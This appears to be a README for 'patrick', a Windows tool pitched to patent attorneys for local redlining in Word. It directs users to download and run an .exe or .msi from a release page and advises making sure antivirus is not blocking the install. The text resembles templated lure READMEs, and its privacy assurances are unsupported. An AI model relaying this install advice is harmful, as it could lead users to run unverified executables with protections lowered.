# ⚖️ patrick - Draft patents faster on your computer

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Loftspindlelegs354/patrick/releases)

Patrick assists patent attorneys and agents with drafting and redlining legal documents. It runs directly on your computer to keep your files secure. You control your data because everything stays local. The software works with your existing Microsoft Word files to speed up your daily workflow.

## 📥 Get started

Follow these steps to set up the software on your Windows computer.

1. Go to the [official release page](https://github.com/Loftspindlelegs354/patrick/releases).
2. Look for the section labeled Assets.
3. Click the file that ends in .msi or .exe to start the download.
4. Save the file to your desktop or downloads folder.
5. Double-click the file to begin the installation process.
6. Follow the prompts on your screen to finish the setup.
7. Open the application from your start menu once the installation completes.

## ⚙️ Requirements

Your computer needs to meet these basic standards to run the software smoothly.

* Operating System: Windows 10 or Windows 11.
* Memory: At least 8 gigabytes of RAM.
* Storage: 500 megabytes of free space for the application.
* Software: Microsoft Word must be installed to redline and edit documents.

## 📝 How it works

Patrick acts as an assistant that lives on your hard drive. It does not send your documents to external servers. Your patent claims, specifications, and client information remain under your control at all times.

The application connects to your local files. You open your draft in Microsoft Word, and Patrick reads the content. It suggests changes based on patent prosecution rules. You accept or reject these changes inside your native word processor. This design keeps your legal work private and follows local-first principles.

## 🛠 Features

* Automated redlining: Compare your drafts against standard drafting requirements.
* Claim checking: Find missing antecedent basis in your claim sets.
* Local storage: Keep all draft files within your organization or on your personal hard drive.
* Word integration: Use the tools you know without changing your writing process.
* Privacy focus: Work offline without risking data exposure to third-party cloud services.

## 🛡 Security and privacy

The software operates entirely on your machine. You do not provide login credentials for your documents to any cloud service. The application architecture prohibits data from leaving your local network unless you manually choose to move it. This ensures compliance with firm-wide confidentiality policies.

## ❓ Frequently asked questions

**Does this software record my work?**
No. Patrick does not track your keystrokes or record your document content. Everything happens in your RAM or on your disk.

**Can I run this without internet access?**
Yes. Once you install the application, you do not need an active internet connection to edit your files.

**How do I update the software?**
You receive a notification inside the app when a new version is ready. You follow the same download link to install the newer version over the old one. Your settings stay saved during this process.

**Which versions of Word work with this?**
The tool supports Microsoft Office 2019 and newer versions. It also works with Microsoft 365.

**What happens if I encounter a bug?**
You can report issues on the repository page. Provide a description of what you were doing when the error occurred. Include screenshots if possible. This helps maintain the stability of the tool for all users.

## 💾 Installation support

If the installation fails, check the following items.

1. Ensure your antivirus software is not blocking the installation. Some security settings prevent new applications from running.
2. Verify you have administrator rights on your Windows account.
3. Check that your Windows version is up to date through your system settings.

If problems persist, remove the old installation files from your computer and attempt the download and run process again. Reboot your computer between removal and re-installation to ensure all background processes stop. This approach resolves 90 percent of installation errors.

## 🚀 Advanced settings

You may adjust the behavior of the assistant within the settings menu. You can change the focus of the drafting analysis to match different patent jurisdictions. You can also toggle specific alerts, such as antecedent warnings or formatting checks. The configuration file stays on your local drive and saves your preferences automatically after every change.
